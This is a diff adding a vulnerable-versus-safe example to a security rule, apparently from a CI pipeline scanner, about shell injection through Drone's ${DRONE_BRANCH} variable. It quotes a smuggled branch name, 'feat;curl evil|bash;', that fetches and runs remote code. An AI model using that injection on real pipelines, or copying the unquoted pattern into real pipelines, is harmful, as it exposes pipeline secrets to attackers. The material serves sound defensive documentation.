@@ -64,6 +64,39 @@ RULE = Rule(
         "fire here, those land under DR-004 / SBOM-style "
         "audits.",
     ),
+    exploit_example=(
+        "# Vulnerable: a branch named ``feat;curl evil|bash;`` lands\n"
+        "# verbatim in the shell command via the\n"
+        "# ``${DRONE_BRANCH}`` template variable. The injected\n"
+        "# ``curl`` runs in the step's shell context with the\n"
+        "# step's full secret set in scope.\n"
+        "kind: pipeline\n"
+        "type: docker\n"
+        "name: build\n"
+        "steps:\n"
+        "  - name: build\n"
+        "    image: alpine@sha256:abc123...\n"
+        "    commands:\n"
+        "      - echo \"Building ${DRONE_BRANCH}\"\n"
+        "      - ./build.sh --branch ${DRONE_BRANCH}\n"
+        "\n"
+        "# Safe: assign the untrusted value to a local shell\n"
+        "# variable, quote on every use, and pass as an argument\n"
+        "# to a script you own. Drone's template substitution\n"
+        "# happens BEFORE the shell sees the command, so the\n"
+        "# defense has to be at the shell layer.\n"
+        "kind: pipeline\n"
+        "type: docker\n"
+        "name: build\n"
+        "steps:\n"
+        "  - name: build\n"
+        "    image: alpine@sha256:abc123...\n"
+        "    environment:\n"
+        "      BRANCH: ${DRONE_BRANCH}\n"
+        "    commands:\n"
+        "      - echo \"Building $BRANCH\"\n"
+        "      - ./build.sh --branch \"$BRANCH\""
+    ),
 )
 
 
